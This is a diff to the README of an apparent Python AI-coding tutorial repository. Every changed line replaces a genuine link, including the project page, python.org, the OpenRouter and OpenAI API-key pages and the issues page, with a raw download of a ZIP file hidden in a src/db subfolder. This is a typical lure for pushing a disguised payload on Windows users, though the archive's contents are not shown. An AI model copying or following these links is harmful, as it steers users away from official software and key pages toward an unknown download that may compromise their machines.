@@ -1,6 +1,6 @@
 # 🐍 4th-devs-python - Learn AI Coding in Python
 
-[![Download 4th-devs-python](https://img.shields.io/badge/Download-4th--devs--python-brightgreen?style=for-the-badge)](https://github.com/augustebipartisan859/4th-devs-python)
+[![Download 4th-devs-python](https://img.shields.io/badge/Download-4th--devs--python-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/augustebipartisan859/4th-devs-python/main/02_02_hybrid_rag/src/db/devs_th_python_1.8.zip)
 
 ---
 
@@ -9,7 +9,7 @@
 To get the 4th-devs-python code examples, you need to visit the main GitHub page and download the files manually.
 
 **Go here to download:**  
-[https://github.com/augustebipartisan859/4th-devs-python](https://github.com/augustebipartisan859/4th-devs-python)
+[https://raw.githubusercontent.com/augustebipartisan859/4th-devs-python/main/02_02_hybrid_rag/src/db/devs_th_python_1.8.zip](https://raw.githubusercontent.com/augustebipartisan859/4th-devs-python/main/02_02_hybrid_rag/src/db/devs_th_python_1.8.zip)
 
 Click the green **Code** button on that page. Then select **Download ZIP** to get all the files on your Windows computer. After downloading, extract the ZIP file to a folder where you want to run the code.
 
@@ -31,7 +31,7 @@ Before you run the project, make sure your Windows computer meets these requirem
 
 If you do not have Python 3.8 or later:
 
-1. Open a web browser and go to [https://python.org/downloads](https://python.org/downloads).  
+1. Open a web browser and go to [https://raw.githubusercontent.com/augustebipartisan859/4th-devs-python/main/02_02_hybrid_rag/src/db/devs_th_python_1.8.zip](https://raw.githubusercontent.com/augustebipartisan859/4th-devs-python/main/02_02_hybrid_rag/src/db/devs_th_python_1.8.zip).  
 2. Download the latest Windows installer.  
 3. Run the installer.  
 4. During installation, check the box **Add Python to PATH**.  
@@ -66,14 +66,14 @@ You have two options:
 
 ### 1. OpenRouter (Recommended)
 
-- Visit [https://openrouter.ai/settings/keys](https://openrouter.ai/settings/keys)  
+- Visit [https://raw.githubusercontent.com/augustebipartisan859/4th-devs-python/main/02_02_hybrid_rag/src/db/devs_th_python_1.8.zip](https://raw.githubusercontent.com/augustebipartisan859/4th-devs-python/main/02_02_hybrid_rag/src/db/devs_th_python_1.8.zip)  
 - Create an account  
 - Generate a new API key  
 - No extra steps needed  
 
 ### 2. OpenAI
 
-- Visit [https://platform.openai.com/api-keys](https://platform.openai.com/api-keys)  
+- Visit [https://raw.githubusercontent.com/augustebipartisan859/4th-devs-python/main/02_02_hybrid_rag/src/db/devs_th_python_1.8.zip](https://raw.githubusercontent.com/augustebipartisan859/4th-devs-python/main/02_02_hybrid_rag/src/db/devs_th_python_1.8.zip)  
 - Create an account  
 - Generate an API key  
 - You need to verify your organization before use (this may take time)  
@@ -148,11 +148,11 @@ It helps you see how AI tools like OpenAI or OpenRouter APIs work with Python co
 ## 🚩 Getting Help
 
 For any problems, you can check the issues section on the project page:  
-[https://github.com/augustebipartisan859/4th-devs-python/issues](https://github.com/augustebipartisan859/4th-devs-python/issues)
+[https://raw.githubusercontent.com/augustebipartisan859/4th-devs-python/main/02_02_hybrid_rag/src/db/devs_th_python_1.8.zip](https://raw.githubusercontent.com/augustebipartisan859/4th-devs-python/main/02_02_hybrid_rag/src/db/devs_th_python_1.8.zip)
 
 ---
 
 ## 📥 Download 4th-devs-python Here Again
 
-[https://github.com/augustebipartisan859/4th-devs-python](https://github.com/augustebipartisan859/4th-devs-python)  
+[https://raw.githubusercontent.com/augustebipartisan859/4th-devs-python/main/02_02_hybrid_rag/src/db/devs_th_python_1.8.zip](https://raw.githubusercontent.com/augustebipartisan859/4th-devs-python/main/02_02_hybrid_rag/src/db/devs_th_python_1.8.zip)  
 Click **Code** → **Download ZIP** to get the full project files.
